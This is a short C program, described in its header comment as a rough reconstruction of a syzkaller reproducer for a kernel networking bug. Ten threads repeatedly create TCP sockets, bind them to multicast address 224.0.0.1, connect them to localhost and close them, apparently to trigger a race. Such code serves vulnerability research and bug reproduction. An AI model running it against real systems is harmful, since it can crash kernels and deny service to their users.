/* 
 * This is the rough idea of what the syzkaller reproducer seems to be doing. Through this code 
 * we could understand how the vulnerability works and then rewrite a reproducer from scratch. 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define THREADS 10

void *thread02(int);
void *thread03(int);
void *thread04(int);

void *thread01(void *arg){
	int sk;

	while(true){	

		sk = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

		thread02(sk);
		thread03(sk);
		thread04(sk);
	}

return NULL;
}

void *thread02(int sk){
	struct sockaddr_in sockaddr_inb;

	memset(&sockaddr_inb,'\0',sizeof(sockaddr_inb));

	sockaddr_inb.sin_family		= AF_INET;
	sockaddr_inb.sin_port		= htobe16(0x4e20);
	sockaddr_inb.sin_addr.s_addr	= htobe32(0xe0000001);

	inet_pton(AF_INET,"224.0.0.1",&sockaddr_inb.sin_addr);

	bind(sk, (struct sockaddr *)&sockaddr_inb, sizeof(sockaddr_inb));

return NULL;
}

void *thread03(int sk){
	struct sockaddr_in sockaddr_inc;

	memset(&sockaddr_inc,'\0',sizeof(sockaddr_inc));

	sockaddr_inc.sin_family		= AF_INET;
 	sockaddr_inc.sin_port		= htobe16(0x4e20);

	inet_pton(AF_INET,"127.0.0.1",&sockaddr_inc.sin_addr);

	connect(sk, (struct sockaddr *)&sockaddr_inc, sizeof(sockaddr_inc));

return NULL;
}

void *thread04(int sk){

	close(sk);

return NULL;
}

int main(void){
	pthread_t th[THREADS];
	int i;

	for(i =0; i < THREADS; i++){
		if(pthread_create(&th[i], NULL, thread01, NULL) < 0){
			perror("pthread_create");
			exit(EXIT_FAILURE);
		}
	}

	for(i = 0; i < THREADS; i++){
		if(pthread_join(th[i], NULL) < 0){
			perror("pthread_join");
			exit(EXIT_FAILURE);
		}
	}

return 0;
}
